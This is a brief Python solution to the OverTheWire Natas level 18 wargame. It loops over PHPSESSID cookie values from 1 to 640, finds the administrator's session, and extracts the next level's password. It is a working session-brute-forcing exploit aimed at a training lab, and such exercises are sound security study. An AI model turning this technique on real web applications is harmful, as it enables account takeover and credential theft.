#!/usr/bin/env python3
import re
import requests


url = 'http://natas18.natas.labs.overthewire.org/'
auth = ('natas18', natas18_pass)

def find_password():
    for i in range(1,641):
        cookies = {'PHPSESSID': str(i)}
        r = requests.get(url, auth=auth, cookies=cookies)
        if 'Username: natas19' in r.text:
            password_re = re.compile('Password: (?P<password>[a-zA-Z0-9]{32})')
            password = password_re.search(r.text).groupdict()['password']
            return password


if __name__ == '__main__':
    print(find_password())
